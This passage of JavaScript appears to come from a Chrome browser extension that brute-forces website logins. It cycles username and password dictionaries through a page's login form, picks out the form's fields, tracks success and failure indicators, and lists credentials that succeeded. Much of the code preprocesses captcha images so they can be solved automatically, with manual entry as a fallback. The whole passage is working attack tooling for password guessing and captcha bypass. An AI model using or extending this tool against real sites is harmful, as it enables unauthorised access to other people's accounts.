    img.src = dataUrl;
  });
}

// 策略 1：颜色过滤 —— 提取与背景色差异大的像素
function preprocessColorFilter(dataUrl) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = () => {
      const scale = getAdaptiveScale(img.height);
      const pad = 10;
      const w = img.width * scale;
      const h = img.height * scale;
      const canvas = document.createElement('canvas');
      canvas.width = w + pad * 2;
      canvas.height = h + pad * 2;
      const ctx = canvas.getContext('2d');

      ctx.fillStyle = '#fff';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.imageSmoothingEnabled = true;
      ctx.imageSmoothingQuality = 'high';
      ctx.drawImage(img, pad, pad, w, h);

      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const d = imageData.data;

      // 从图片边缘多点采样背景色（中位数，避免噪点线干扰）
      const borderPixels = [];
      const stepX = Math.max(1, Math.floor(w / 12));
      const stepY = Math.max(1, Math.floor(h / 8));
      for (let x = pad; x < pad + w; x += stepX) {
        borderPixels.push(pad * canvas.width + x);
        borderPixels.push((pad + h - 1) * canvas.width + x);
      }
      for (let y = pad; y < pad + h; y += stepY) {
        borderPixels.push(y * canvas.width + pad);
        borderPixels.push(y * canvas.width + pad + w - 1);
      }
      const rVals = [], gVals = [], bVals = [];
      for (const idx of borderPixels) {
        rVals.push(d[idx * 4]);
        gVals.push(d[idx * 4 + 1]);
        bVals.push(d[idx * 4 + 2]);
      }
      rVals.sort((a, b) => a - b);
      gVals.sort((a, b) => a - b);
      bVals.sort((a, b) => a - b);
      const mid = Math.floor(rVals.length / 2);
      const bgR = rVals[mid];
      const bgG = gVals[mid];
      const bgB = bVals[mid];

      for (let i = 0; i < d.length; i += 4) {
        const dr = d[i] - bgR;
        const dg = d[i + 1] - bgG;
        const db = d[i + 2] - bgB;
        const colorDist = Math.sqrt(dr * dr + dg * dg + db * db);

        const max = Math.max(d[i], d[i + 1], d[i + 2]);
        const min = Math.min(d[i], d[i + 1], d[i + 2]);
        const saturation = max === 0 ? 0 : (max - min) / max;

        const isText = colorDist > 60 || (saturation > 0.25 && max < 200);
        d[i] = d[i + 1] = d[i + 2] = isText ? 0 : 255;
        d[i + 3] = 255;
      }

      // 形态学开运算：先膨胀去噪点，再腐蚀恢复文字粗细
      morphDilate(d, canvas.width, canvas.height);
      morphErode(d, canvas.width, canvas.height);
      medianFilter(d, canvas.width, canvas.height);
      ctx.putImageData(imageData, 0, 0);
      resolve(canvas.toDataURL('image/png'));
    };
    img.src = dataUrl;
  });
}

// 策略 2：灰度 + Otsu 自适应二值化
function preprocessGrayscale(dataUrl) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = () => {
      const scale = getAdaptiveScale(img.height);
      const pad = 10;
      const w = img.width * scale;
      const h = img.height * scale;
      const canvas = document.createElement('canvas');
      canvas.width = w + pad * 2;
      canvas.height = h + pad * 2;
      const ctx = canvas.getContext('2d');
      ctx.imageSmoothingEnabled = true;
      ctx.imageSmoothingQuality = 'high';
      ctx.fillStyle = '#fff';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(img, pad, pad, w, h);

      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const d = imageData.data;
      const grayArr = new Uint8Array(d.length / 4);
      for (let i = 0; i < d.length; i += 4) {
        grayArr[i / 4] = Math.round(d[i] * 0.299 + d[i + 1] * 0.587 + d[i + 2] * 0.114);
      }
      const threshold = otsuThreshold(grayArr);
      for (let i = 0; i < d.length; i += 4) {
        const val = grayArr[i / 4] > threshold ? 255 : 0;
        d[i] = d[i + 1] = d[i + 2] = val;
        d[i + 3] = 255;
      }
      medianFilter(d, canvas.width, canvas.height);
      ctx.putImageData(imageData, 0, 0);
      resolve(canvas.toDataURL('image/png'));
    };
    img.src = dataUrl;
  });
}

// 策略 4：固定阈值二值化（Otsu 不可靠时的保底）
function preprocessFixedThreshold(dataUrl) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = () => {
      const scale = getAdaptiveScale(img.height);
      const pad = 10;
      const w = img.width * scale;
      const h = img.height * scale;
      const canvas = document.createElement('canvas');
      canvas.width = w + pad * 2;
      canvas.height = h + pad * 2;
      const ctx = canvas.getContext('2d');
      ctx.imageSmoothingEnabled = true;
      ctx.imageSmoothingQuality = 'high';
      ctx.fillStyle = '#fff';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(img, pad, pad, w, h);

      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const d = imageData.data;
      for (let i = 0; i < d.length; i += 4) {
        const gray = Math.round(d[i] * 0.299 + d[i + 1] * 0.587 + d[i + 2] * 0.114);
        const val = gray > 140 ? 255 : 0;
        d[i] = d[i + 1] = d[i + 2] = val;
        d[i + 3] = 255;
      }
      // 形态学开运算清理噪点
      morphDilate(d, canvas.width, canvas.height);
      morphErode(d, canvas.width, canvas.height);
      medianFilter(d, canvas.width, canvas.height);
      ctx.putImageData(imageData, 0, 0);
      resolve(canvas.toDataURL('image/png'));
    };
    img.src = dataUrl;
  });
}

// 策略 3：反色二值化（对于浅色背景深色文字）
function preprocessInvert(dataUrl) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = () => {
      const scale = getAdaptiveScale(img.height);
      const pad = 10;
      const w = img.width * scale;
      const h = img.height * scale;
      const canvas = document.createElement('canvas');
      canvas.width = w + pad * 2;
      canvas.height = h + pad * 2;
      const ctx = canvas.getContext('2d');
      ctx.imageSmoothingEnabled = true;
      ctx.imageSmoothingQuality = 'high';
      ctx.fillStyle = '#fff';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(img, pad, pad, w, h);

      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const d = imageData.data;
      const grayArr = new Uint8Array(d.length / 4);
      for (let i = 0; i < d.length; i += 4) {
        grayArr[i / 4] = Math.round(d[i] * 0.299 + d[i + 1] * 0.587 + d[i + 2] * 0.114);
      }
      const threshold = otsuThreshold(grayArr);
      // 反色：暗的变白，亮的变黑
      for (let i = 0; i < d.length; i += 4) {
        const val = grayArr[i / 4] <= threshold ? 255 : 0;
        d[i] = d[i + 1] = d[i + 2] = val;
        d[i + 3] = 255;
      }
      medianFilter(d, canvas.width, canvas.height);
      ctx.putImageData(imageData, 0, 0);
      resolve(canvas.toDataURL('image/png'));
    };
    img.src = dataUrl;
  });
}

// 3x3 中值过滤去噪点
function medianFilter(d, width, height) {
  const copy = new Uint8Array(d.length);
  for (let i = 0; i < d.length; i++) copy[i] = d[i];

  for (let y = 1; y < height - 1; y++) {
    for (let x = 1; x < width - 1; x++) {
      const neighbors = [];
      for (let dy = -1; dy <= 1; dy++) {
        for (let dx = -1; dx <= 1; dx++) {
          const idx = ((y + dy) * width + (x + dx)) * 4;
          neighbors.push(copy[idx]);
        }
      }
      neighbors.sort((a, b) => a - b);
      const idx = (y * width + x) * 4;
      const median = neighbors[4];
      d[idx] = d[idx + 1] = d[idx + 2] = median;
    }
  }
}

function otsuThreshold(grayArr) {
  const hist = new Array(256).fill(0);
  for (let i = 0; i < grayArr.length; i++) hist[grayArr[i]]++;
  const total = grayArr.length;
  let sum = 0;
  for (let i = 0; i < 256; i++) sum += i * hist[i];
  let sumB = 0, wB = 0, wF = 0, maxVar = 0, bestT = 0;
  for (let t = 0; t < 256; t++) {
    wB += hist[t];
    if (wB === 0) continue;
    wF = total - wB;
    if (wF === 0) break;
    sumB += t * hist[t];
    const mB = sumB / wB;
    const mF = (sum - sumB) / wF;
    const between = wB * wF * (mB - mF) * (mB - mF);
    if (between > maxVar) { maxVar = between; bestT = t; }
  }
  return bestT;
}

// 手动验证码输入
function requestManualCaptcha(dataUrl) {
  return new Promise((resolve) => {
    captchaResolve = resolve;
    $('captcha-preview').src = dataUrl;
    $('captcha-manual-input').value = '';
    $('captcha-section').hidden = false;
    $('captcha-manual-input').focus();
    showStatus('请输入验证码后点击确认', 'warning');
  });
}

function onCaptchaConfirm() {
  const text = $('captcha-manual-input').value.trim();
  $('captcha-section').hidden = true;
  if (captchaResolve) {
    captchaResolve(text);
    captchaResolve = null;
  }
}

// ====================== 与 Content Script 通信 ======================
function sendToContent(type, data = {}) {
  return new Promise((resolve, reject) => {
    chrome.tabs.sendMessage(state.tabId, { type, ...data }, { frameId: state.frameId }, (response) => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError.message));
      } else if (response && response.error) {
        reject(new Error(response.error));
      } else {
        resolve(response || {});
      }
    });
  });
}

// 向指定 frame 发消息
function sendToFrame(tabId, frameId, type, data = {}) {
  return new Promise((resolve, reject) => {
    chrome.tabs.sendMessage(tabId, { type, ...data }, { frameId }, (response) => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError.message));
      } else if (response && response.error) {
        reject(new Error(response.error));
      } else {
        resolve(response || {});
      }
    });
  });
}

// ====================== 持久化 ======================
function saveData() {
  chrome.storage.local.set({
    selectors: state.selectors,
    config: state.config,
    dictUsername: state.dictUsername,
    dictPassword: state.dictPassword,
    results: state.results,
    frameId: state.frameId,
  });
}

// ====================== UI 更新 ======================
function updateUI() {
  updateSelectorUI();
  updateDictUI();
  updateSettingsUI();
  updateControlUI();
  renderResults();
}

function updateSelectorUI() {
  $('sel-username').value = state.selectors.username;
  $('sel-password').value = state.selectors.password;
  $('sel-captcha-input').value = state.selectors.captchaInput;
  $('sel-captcha-img').value = state.selectors.captchaImg;
  $('sel-submit').value = state.selectors.submit;
}

function updateDictUI() {
  $('dict-username').value = state.dictUsername;
  $('dict-password').value = state.dictPassword;
  updateDictCount('username');
  updateDictCount('password');
}

function updateSettingsUI() {
  $('delay').value = state.config.delay;
  $('fail-indicator').value = state.config.failIndicator || '';
  $('success-indicator').value = state.config.successIndicator || '';
  $('chk-captcha').checked = state.config.captchaEnabled;
  $('chk-refresh-captcha').checked = state.config.refreshCaptcha;
}

function updateControlUI() {
  const running = state.status === 'running';
  const paused = state.status === 'paused';
  $('btn-start').disabled = running || paused;
  $('btn-pause').disabled = !running && !paused;
  $('btn-stop').disabled = !running && !paused;
  $('btn-pause').textContent = paused ? '继续' : '暂停';
}

function updatePickButtons(activeType) {
  document.querySelectorAll('.pick').forEach((btn) => {
    if (activeType && btn.dataset.target === activeType) {
      btn.textContent = '取消';
      btn.classList.add('active');
    } else {
      btn.textContent = '选取';
      btn.classList.remove('active');
      btn.disabled = !!state.isPicking;
    }
  });
}

function updateDictCount(type) {
  const text = type === 'username' ? state.dictUsername : state.dictPassword;
  const count = parseDict(text).length;
  $(type === 'username' ? 'user-count' : 'pwd-count').textContent = count + ' 条';
}

function updateProgress(current, total, username, password) {
  const pct = total > 0 ? Math.round((current / total) * 100) : 0;
  $('progress-fill').style.width = pct + '%';
  $('progress-text').textContent = (current + 1) + ' / ' + total + '  (' + pct + '%)';
  $('current-attempt').textContent = username + ' : ' + password;
}

function showStatus(text, type) {
  const bar = $('status-bar');
  bar.textContent = text;
  bar.className = 'status ' + type;
}

function renderResults() {
  const container = $('results');
  if (!state.results.length) {
    container.innerHTML = '<div class="no-results">暂无结果</div>';
    return;
  }
  container.innerHTML = state.results.map((r) =>
    '<div class="result-item">' +
      '<span class="result-creds">' + escapeHtml(r.username) + ' : ' + escapeHtml(r.password) + '</span>' +
      '<span class="result-status">' + (r.result === 'success' ? '✓ 成功' : '? 可能') + '</span>' +
      '<span class="result-time">' + escapeHtml(r.time) + '</span>' +
    '</div>'
  ).join('');
}

function addLog(text, cls) {
  const el = $('log');
  const line = document.createElement('div');
  line.className = 'log-line' + (cls ? ' log-' + cls : '');
  line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + text;
  el.appendChild(line);
  el.scrollTop = el.scrollHeight;
}

// ====================== 工具函数 ======================
function $(id) { return document.getElementById(id); }

function parseDict(text) {
  if (!text) return [];
  return text.split('\n').map((l) => l.trim()).filter((l) => l.length > 0);
}

function getLabel(type) {
  return { username: '用户名输入框', password: '密码输入框', captchaInput: '验证码输入框', captchaImg: '验证码图片', submit: '登录按钮' }[type] || type;
}

function escapeHtml(s) {
  const d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}
